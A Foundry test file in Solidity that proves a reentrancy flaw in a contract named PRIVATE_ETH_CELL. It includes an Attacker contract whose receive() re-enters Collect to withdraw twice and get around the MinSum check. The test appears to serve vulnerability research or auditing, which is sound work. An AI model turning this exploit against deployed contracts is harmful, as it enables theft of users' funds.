
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {
    
    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 2 && attackVal < type(uint128).max);
        // Ensure attackVal is even to allow clean division by 2 for the attack logic
        attackVal = (attackVal / 2) * 2;

        // Configure the vulnerable contract
        // We set MinSum to attackVal. 
        // The vulnerability allows us to withdraw funds even if the balance drops below MinSum during execution.
        _contractUnderTest.SetMinSum(attackVal);
        _contractUnderTest.Initialized();

        vm.deal(address(_contractUnderTest), attackVal); 
        
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertEq(address(_attacker).balance, attackVal, "Attacker should have withdrawn the full amount bypassing MinSum check");
    }

    receive() external payable {}
}

contract Attacker {
    
    PRIVATE_ETH_CELL public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PRIVATE_ETH_CELL(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit the funds to establish the initial balance >= MinSum
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // We attempt to withdraw half the value twice.
        // Normally, after the first withdrawal, balance < MinSum, so the second should fail.
        // With reentrancy, we bypass the check.
        uint256 halfVal = val / 2;
        storedVal = halfVal;

        victim.Collect(halfVal);

        // If we successfully re-entered and received funds twice, count should be 2
        if (attackCallCount == 2 && address(this).balance == val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter
            victim.Collect(storedVal);
        } else {
            attackCallCount++;
        }
    }
}
